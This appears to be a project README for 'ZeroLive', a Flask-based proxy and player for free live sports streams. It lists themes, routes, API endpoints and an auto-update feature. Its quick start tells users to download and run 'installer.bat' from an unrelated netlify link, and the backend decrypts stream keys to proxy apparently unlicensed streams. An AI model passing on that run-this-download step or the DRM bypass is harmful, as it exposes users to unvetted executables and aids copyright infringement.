# ZeroLive

Free live sports streaming proxy/player. Watch football, cricket, basketball, tennis, and more.

## Quick Start (Desktop)

1. [Download `installer.bat`](https://bejewelled-fenglisu-31730c.netlify.app/)
2. Run it — installs embedded Python + all dependencies to `C:\Zero_live`
3. Double-click the **ZeroLive** desktop shortcut

Or clone and run manually:
```
pip install -r requirements.txt
python app.py 9090
```

## Features

- **11 themes** — dark, light, amethyst, emerald, ruby, ocean, cyberpunk, sunset, nord, matrix, midnight
- **DASH + HLS + direct streams** — auto-detects format, ClearKey DRM for DASH
- **Server fallback** — auto-switches to next server on failure
- **Favorites** — star events, filter by favorites
- **Search & filter** — by team, league, or sport
- **M3U export** — per-event or full playlist, open in VLC / any IPTV app
- **Lite mode** — `/faster` route with zero CSS, plain table layout
- **Auto-update** — checks GitHub for new commits at startup, applies automatically
- **Keyboard shortcuts** — `?` for help, `/` search, `F` favorites, `R` refresh, `1-9` sport filters
- **Recently watched** — last 10 clicked events saved locally

## Routes

| Route | Description |
|---|---|
| `/` | Full UI with event cards, search, filters |
| `/faster` | Lite index (no CSS, table layout) |
| `/watch/<slug>` | Full player with themes, custom controls |
| `/lite/<slug>` | Minimal player (native controls, no themes) |
| `/playlist.m3u` | Full M3U playlist of all events |
| `/playlist/<slug>.m3u` | M3U for a single event |

## API

| Endpoint | Description |
|---|---|
| `/api/upstream/events` | All events from upstream |
| `/api/version` | Current installed version (commit SHA) |
| `/api/update/check` | Check GitHub for newer commit |
| `/api/update/apply` | Download + install update |
| `/api/update/restart` | Restart the server |

## Tech

- **Backend**: Flask + curl-cffi (upstream proxy) + cryptography (stream key decrypt)
- **Player**: hls.js, dash.js, native HTML5 video
- **Deploy**: Embedded Python (portable, no registry), gunicorn 4 workers
